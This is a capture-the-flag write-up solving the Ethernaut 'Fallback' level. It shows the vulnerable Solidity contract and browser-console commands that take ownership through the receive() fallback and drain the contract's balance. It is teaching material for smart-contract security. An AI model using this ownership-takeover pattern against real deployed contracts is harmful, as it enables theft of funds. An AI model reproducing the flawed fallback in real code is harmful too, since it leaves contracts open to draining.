# Ethernaut - Level 1 - Fallback

Contract code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

Objectives:
```
You will beat this level if

	1. you claim ownership of the contract
	2. you reduce its balance to 0
```

As we can see from the code, there is a function called "contribute" that allow us to deposit a value inside the contributions mapping. We can only send less than 0.001 ether.
Another interesting function is: 
```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

This is a so-called fallback function in solidity, that we can trigger with, for example, sendTransaction(object). With this function we can change the owner of the contract, and then call withraw(). 

Another important piece of the contract is the onlyOwner modifier: this is a modifier that is used to implement an Access Control policiy on the withdraw method: only the owner of the contract can call this method.

So the exploit plan is this:

	1. Deposit < 0.001 ether via the contribute function
	2. Call receive fallback function to become the owner of the contract
	3. Call withdraw

From the browser's console we can interact with the contract.

``` 
contract.contribute.sendTransaction({from: player, to: contract.address, value: toWei("0.0001")});
contract.sendTransaction({from: player, to: contract.address, value: toWei("0.007")})
contract.owner //Now we are the owner of the contract
contract.withdraw()
//Then you need to submit the instance
```
